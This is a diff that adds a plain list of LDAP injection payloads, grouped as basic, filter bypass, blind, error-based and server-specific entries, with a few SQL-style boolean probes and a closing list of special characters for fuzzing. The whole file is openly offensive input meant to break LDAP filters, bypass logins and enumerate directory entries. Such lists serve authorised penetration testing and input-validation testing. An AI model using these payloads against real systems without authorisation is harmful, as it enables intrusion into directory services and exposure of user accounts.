@@ -1,0 +1,81 @@
+# LDAP Injection Payloads
+
+# Basic Payloads
+*
+)(uid=*))
+|
+&
+)
+(cn=*)
+(uid=*)
+(mail=*)
+*()|%26
+*()|&
+
+# Filter Bypass Payloads
+)(cn=Babs Jensen
+)(|(uid=*))
+*)(&)
+*)|(&)
+*))%26%26(|(sn=a)(sn=b)
+a*)(|(objectclass=*))
+
+# Blind Payloads
+*)(uid=admin)
+*
+x' AND 1=1 AND 'y'='y
+x' AND 1=2 AND 'y'='y
+
+# Error-Based Payloads
+'
+)(
+()
+)(cn=a'
+*()
+()|
+
+# Payloads for specific LDAP servers
+(objectClass=*)
+(&(objectClass=*)(|(uid=*)(mail=*)))
+(uid=admin)
+(login=*)
+(user=*)
+(employeeID=*)
+
+# Common special characters
+\
+/
+//
+.
+..
+...
+!
+@
+#
+$
+%
+^
+&
+*
+(
+)
+-
+_
++
+=
+{
+}
+[
+]
+|
+;
+:
+'
+"
+<
+>
+,
+.
+?
+~
+`
